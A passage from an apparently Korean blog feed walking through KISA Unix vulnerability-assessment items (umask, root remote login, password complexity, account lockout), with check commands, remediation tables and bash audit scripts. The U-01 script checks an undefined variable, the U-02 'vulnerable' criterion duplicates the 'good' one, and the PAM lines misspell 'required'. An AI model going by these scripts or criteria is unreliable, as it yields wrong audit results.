<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/profile | grep <span class="string">&quot;umask&quot;</span> | grep -v <span class="string">&quot;#&quot;</span> | cut -c 11-13 | grep -v <span class="string">&quot;022&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> -lt 022 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-56 [UMASK 설정 관리] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-56.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>UMASK</code> 값이 022보다 작으면 <code>취약</code>, 아니면 <code>양호</code>처리했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-56</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-56/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-01 root 계정 원격접속 제한</title>
    <url>/2022/01/21/2022-01-21-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-01%20root%20%EA%B3%84%EC%A0%95%20%EC%9B%90%EA%B2%A9%EC%A0%91%EC%86%8D%20%EC%A0%9C%ED%95%9C/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>시스템 정책에 root 계정의 원격터미널 접속차단 설정이 적용되어 있는지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-01</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>관리자 계정 탈취로 인한 시스템 장악을 방지하기 위해 외부 비인가자의 root 계정 접근 시도를 원천적으로 차단하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>root 계정은 운영체제의 모든기능을 설정 및 변경이 가능하여 root 계정을 탈취하여 외부에서 원격을 이용한 시스템 장악 및 각종 공격으로인한 root 계정 사용 불가 위협이 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 원격 터미널 서비스를 사용하지 않거나, 사용 시 root 직접 접속을  차단한 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 원격 터미널 서비스 사용 시 root 직접 접속을 허용한 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><strong>[Telnet]</strong><br /><code># cat /etc/default/login</code><br />    CONSOLE=/dev/console<br /><br /><strong>[SSH]</strong><br /><code># cat /etc/ssh/sshd_config</code><br />    PermitRootLogin no</td>
</tr>
<tr>
<td>LINUX</td>
<td><strong>[Telnet]</strong><br /><code># cat /etc/pam.d/login</code><br />    auth required /libsecurity/pam_securetty.so<br /><code># cat /etc/securetty</code><br />    pts/0 ~ pts/x 관련 설정이 존재하지 않음<br /><br /><strong>[SSH]</strong><br /><code># cat /etc/ssh/sshd_config</code><br />    PermitRootLogin no</td>
</tr>
<tr>
<td>AIX</td>
<td><strong>[Telnet]</strong><br /><code># cat /etc/security/user</code><br />    rlogin = false<br /><br /><strong>[SSH]</strong><br /><code># cat /etc/ssh/sshd_config</code><br />    PermitRootLogin no</td>
</tr>
<tr>
<td>HP-UX</td>
<td><strong>[Telnet]</strong><br /><code># cat /etc/securetty</code><br />    console<br /><br /><strong>[SSH]</strong><br /><code># cat /etc/ssh/sshd_config</code><br />    PermitRootLogin no</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/securetty | grep &quot;pts&quot;</p>
</blockquote>
<br>

<p><code>telnet</code> root 접속이 가능한지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-01/cat_telnet.png">

<br>

<br>

<blockquote>
<p># cat /etc/ssh/sshd_config | grep &quot;PermitRootLogin&quot;</p>
</blockquote>
<br>

<p><code>ssh</code> root 접속이 가능하지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-01/cat_ssh.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><strong>[Telnet]</strong><br />1) vi 편집기를 이용하여 <code>/etc/default/login</code> 파일 열기<br /><br />2) 아래와 같이 주석 제거 또는 신규 삽입<br />    (수정 전) #CONSOLE=/dev/console<br />    (수정 후) CONSOLE=/dev/console<br /><br /><strong>[SSH]</strong><br />1) vi 편집기를 이용하여 <code>/etc/ssh/sshd_config</code> 파일 열기<br /><br />2) 아래와 같이 주석 제거 또는 신규 삽입<br />    (수정 전) #PermitRootLogin Yes<br />    (수정 후) PermitRootLogin No</td>
</tr>
<tr>
<td>LINUX</td>
<td><strong>[Telnet]</strong><br />1) <code>/etc/securetty</code> 파일에서 pts/0 ~ pts/x 설정 제거 또는 주석처리<br /><br />2) <code>/etc/pam.d/login</code> 파일 수정 또는 신규 삽입<br />    (수정 전) #auth requred /lib/security/pam_securetty.so<br />    (수정 후) auth requred /lib/security/pam_securetty.so<br /><br /><strong>[SSH]</strong><br />1) vi 편집기를 이용하여 <code>/etc/ssh/sshd_config</code> 파일 열기<br /><br />2) 아래와 같이 주석 제거 또는 신규 삽입<br />    (수정 전) #PermitRootLogin Yes<br />    (수정 후) PermitRootLogin No</td>
</tr>
<tr>
<td>AIX</td>
<td><strong>[Telnet]</strong><br />1) vi 편집기를 이용하여 <code>/etc/security/user</code> 파일 열기<br /><br />2) <code>rlogin</code> 설정을 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) rlogin = true<br />    (수정 후) rlogin = false<br /><br /><strong>[SSH]</strong><br />1) vi 편집기를 이용하여 <code>/etc/ssh/sshd_config</code> 파일 열기<br /><br />2) 아래와 같이 주석 제거 또는 신규 삽입<br />    (수정 전) #PermitRootLogin Yes<br />    (수정 후) PermitRootLogin No</td>
</tr>
<tr>
<td>HP-UX</td>
<td><strong>[Telnet]</strong><br />1) vi 편집기를 이용하여 <code>/etc/securetty</code> 파일 열기<br /><br />2) 아래와 같이 주석 제거 또는 신규 삽입<br />    (수정 전) #console<br />    (수정 후) console<br /><br /><strong>[SSH]</strong><br />1) vi 편집기를 이용하여 <code>/etc/ssh/sshd_config</code> 파일 열기<br /><br />2) 아래와 같이 주석 제거 또는 신규 삽입<br />    (수정 전) #PermitRootLogin Yes<br />    (수정 후) PermitRootLogin No</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">TelnetResult=<span class="string">&quot;&quot;</span></span><br><span class="line">SshResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">telnet=`cat /etc/securetty | grep <span class="string">&quot;pts&quot;</span>`</span><br><span class="line">ssh=`cat /etc/ssh/sshd_config | grep <span class="string">&quot;PermitRootLogin&quot;</span> | grep -v <span class="string">&quot;#&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$telnet</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        TelnetResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        TelnetResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$ssh</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;yes&quot;</span>* ]]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                SshResult=취약</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                SshResult=양호</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        SshResult=취약</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-01 [root 계정 원격접속 제한]<span class="string">&quot;\n&quot;</span>[TELNET] : <span class="string">&quot;<span class="variable">$TelnetResult</span>&quot;</span><span class="string">&quot;\n&quot;</span>[SSH] : <span class="string">&quot;<span class="variable">$SshResult</span>&quot;</span> | tee /root/result/u-01.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>telnet</code>과 <code>ssh</code> 별로 <code>취약/양호</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-01</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-01/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-02 패스워드 복잡성 설정</title>
    <url>/2022/01/21/2022-01-21-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-02%20%ED%8C%A8%EC%8A%A4%EC%9B%8C%EB%93%9C%20%EB%B3%B5%EC%9E%A1%EC%84%B1%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>시스템 정책에 사용자 계정관련 설정이 되어 있는지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-02</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>패스워드 복잡성 관련 정책이 설정되어 있는지 점검하여 비인가자의 공격에 대비가 되어 있는지 확인하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>복잡성 설정이 되어있지 않은 패스워드는 사회공학적인 유추가 가능할 수 있으며 암호화된 패스워드 해시값을 무작위 대입공격, 사전대입 공격 등으로 단시간에 패스워드 크렉이 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 패스워드 최소길이 8자리 이상, 영문·숫자·특수문자 최소 입력 기능이  설정된 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 패스워드 최소길이 8자리 이상, 영문·숫자·특수문자 최소 입력 기능이  설정된 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><code>/etc/default/passwd</code></td>
</tr>
<tr>
<td>LINUX</td>
<td><strong>[RHEL5]</strong><br /><code>/etc/pam.d/system-auth</code><br /><br /><strong>[RHEL7]</strong><br /><code>/etc/security/pwquality.conf</code></td>
</tr>
<tr>
<td>AIX</td>
<td><code>/etc/security/user</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td><code>/etc/default/security</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/security/pwquality.conf | grep password | grep -v &quot;#&quot;</p>
</blockquote>
<br>

<p>패스워드 정책 설정이 되어있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-02/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><strong>&lt; 부적절한 패스워드 유형 &gt;</strong><br />1. 사전에 나오는 단어나 이들의 조합<br />2. 길이가 너무 짧거나, NULL(공백)인 패스워드<br />3. 키보드 자판의 일련의 나열 (예) abcd, qwert, etc<br />4. 사용자 계정 정보에서 유추 가능한 단어들<br />(예) 지역명, 부서명, 계정명, 사용자 이름의 이니셜, root, rootroot, root123, admin 등<br /><br /><strong>&lt; 패스워드 관리 방법 &gt;</strong><br />1. 영문, 숫자, 특수문자를 조합하여 계정명과 상이한 8자 이상의 패스워드 설정<br />※ 다음 각 목의 문자 종류 중 2종류 이상을 조합하여 최소 10자리 이상 또는, 3종류 이상을 조합하여 최소 8자리 이상의 길이로 구성<br />가. 영문 대문자(26개)<br />나. 영문 소문자(26개)<br />다. 숫자(10개)<br />라. 특수문자(32개)<br />2. 시스템마다 상이한 패스워드 사용<br />3. 패스워드를 기록해 놓을 경우 변형하여 기록</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/security/pwquality.conf | grep password | grep -v <span class="string">&quot;#&quot;</span>`</span><br><span class="line">minlen=`cat /etc/security/pwquality.conf | grep password | grep -v <span class="string">&quot;#&quot;</span> | tr <span class="string">&quot; &quot;</span> <span class="string">&quot;\n&quot;</span> | grep <span class="string">&quot;minlen&quot;</span> | sed <span class="string">&#x27;s/[^0-9]//g&#x27;</span>`</span><br><span class="line">lcredit=`cat /etc/security/pwquality.conf | grep password | grep -v <span class="string">&quot;#&quot;</span> | tr <span class="string">&quot; &quot;</span> <span class="string">&quot;\n&quot;</span> | grep <span class="string">&quot;lcredit&quot;</span>`</span><br><span class="line">ucredit=`cat /etc/security/pwquality.conf | grep password | grep -v <span class="string">&quot;#&quot;</span> | tr <span class="string">&quot; &quot;</span> <span class="string">&quot;\n&quot;</span> | grep <span class="string">&quot;ucredit&quot;</span>`</span><br><span class="line">dcredit=`cat /etc/security/pwquality.conf | grep password | grep -v <span class="string">&quot;#&quot;</span> | tr <span class="string">&quot; &quot;</span> <span class="string">&quot;\n&quot;</span> | grep <span class="string">&quot;dcredit&quot;</span>`</span><br><span class="line">ocredit=`cat /etc/security/pwquality.conf | grep password | grep -v <span class="string">&quot;#&quot;</span> | tr <span class="string">&quot; &quot;</span> <span class="string">&quot;\n&quot;</span> | grep <span class="string">&quot;ocredit&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$minlen</span>&quot;</span> -lt 8 ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                ProcessResult=취약</span><br><span class="line">        <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$lcredit</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$ucredit</span>&quot;</span> ]</span><br><span class="line">                <span class="keyword">then</span></span><br><span class="line">                        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$dcredit</span>&quot;</span> ]</span><br><span class="line">                        <span class="keyword">then</span></span><br><span class="line">                                <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$ocredit</span>&quot;</span> ]</span><br><span class="line">                                <span class="keyword">then</span></span><br><span class="line">                                        ProcessResult=양호</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                        ProcessResult=취약</span><br><span class="line">                                <span class="keyword">fi</span></span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                                ProcessResult=취약</span><br><span class="line">                        <span class="keyword">fi</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                        ProcessResult=취약</span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                ProcessResult=취약</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-02 [패스워드 복잡성 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-02.txt</span><br></pre></td></tr></table></figure>

<br>

<p>패스워드 최소길이가 8자 이상, 영문, 숫자, 특수문자 최소 입력 기능이 설정되어있으면 <code>양호</code>, 아니면 <code>취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-02</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-02/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-03 계정 잠금 임계값 설정</title>
    <url>/2022/01/21/2022-01-21-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-03%20%EA%B3%84%EC%A0%95%20%EC%9E%A0%EA%B8%88%20%EC%9E%84%EA%B3%84%EA%B0%92%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>사용자 계정 로그인 실패 시 계정잠금 임계값이 설정되어 있는지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-03</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>계정탈취 목적의 무작위 대입 공격시 해당 계정을 잠금하여 인증 요청에 응답하는 리소스 낭비를 차단하고 대입 공격으로 인한 비밀번호 노출 공격을 무력화하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>패스워드 탈취 공격의 인증 요청에 대해 설정된 패스워드와 일치 할 때까지 지속적으로 응답하여 해당 계정의 패스워드가 유출될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 계정 잠금 임계값이 10회 이하의 값으로 설정되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 계정 잠금 임계값이 설정되어 있지 않거나, 10회 이하의 값으로 설정되 지 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><code># cat /etc/default/login</code><br />    RETRIES=5<br /><br />SOLARIS 5.9 이상 버전일 경우 추가적으로 <code>policy.conf</code> 파일 확인<br /><br /><code># cat /etc/security/policy.conf</code><br />    LOCK AFTER RETRIES=YES</td>
</tr>
<tr>
<td>LINUX</td>
<td><code># cat /etc/pam.d/system-auth</code><br />    auth required /lib/security/pam_tally.so deny=5 unlock_time=120 no_magic_root<br />    account required /lib/security/pam_tally.so no_magic_root reset</td>
</tr>
<tr>
<td>AIX</td>
<td><code># cat /etc/security/user</code><br />    loginretries=10</td>
</tr>
<tr>
<td>HP-UX</td>
<td><code># cat /tcb/files/auth/system/default</code><br />    u_maxtries#5<br /><br />HP-UX 11.v3 이상일 경우 <code>security</code> 파일 확인<br /><br /><code># cat /etc/default/security</code><br />    AUTH MAXTRIES=10</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/pam.d/system-auth | grep &quot;lib/security/pam_tally.so&quot;</p>
</blockquote>
<br>

<p>계정 잠금 임계값이 설정되어있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-03/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS 5.9<br />이하 버전</td>
<td>1) vi 편집기를 이용하여 <code>/etc/default/login</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) #RETRIES=2<br />    (수정 후) RETRIES=10</td>
</tr>
<tr>
<td>SOLARIS 5.9<br />이상 버전</td>
<td>1) vi 편집기를 이용하여 <code>/etc/default/login</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) #RETRIES=2<br />    (수정 후) RETRIES=10<br /><br />3) vi 편집기를 이용하여 <code>/etc/security/policy.conf</code> 파일 열기<br /><br />4) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) #LOCK_AFTER_RETRIES=NO<br />    (수정 후) LOCK_AFTER_RETRIES=YES</td>
</tr>
<tr>
<td>LINUX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/pam.d/system-auth</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    auth required /lib/security/pam_tally.so deny=5 unlock_time=120 no_magic_root<br />    account required /lib/security/pam_tally.so no_magic_root reset</td>
</tr>
<tr>
<td>AIX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/security/user</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) loginretries = 0<br />    (수정 후) loginretries = 10</td>
</tr>
<tr>
<td>HP-UX 11.v2<br />이하 버전</td>
<td>1) vi 편집기를 이용하여 <code>/tcb/files/auth/system/default</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) u_maxtries#<br />    (수정 후) u_maxtries#10</td>
</tr>
<tr>
<td>HP-UX 11.v3<br />이상 버전</td>
<td>1) vi 편집기를 이용하여 <code>/etc/default/security</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) #AUTH_MAXTRIES=0<br />    (수정 후) AUTH_MAXTRIES=10</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/pam.d/system-auth | grep <span class="string">&quot;lib/security/pam_tally.so deny=5 unlock_time=120 no_magic_root&quot;</span>`</span><br><span class="line">process2=`cat /etc/pam.d/system-auth | grep <span class="string">&quot;lib/security/pam_tally.so no_magic_root reset&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                ProcessResult=양호</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                ProcessResult=취약</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-03 [계정 잠금 임계값 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-03.txt</span><br></pre></td></tr></table></figure>

<br>

<p>계정 잠금 임계값이 설정되어 있으면 <code>양호</code>, 아니면 <code>취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-03</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-03/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
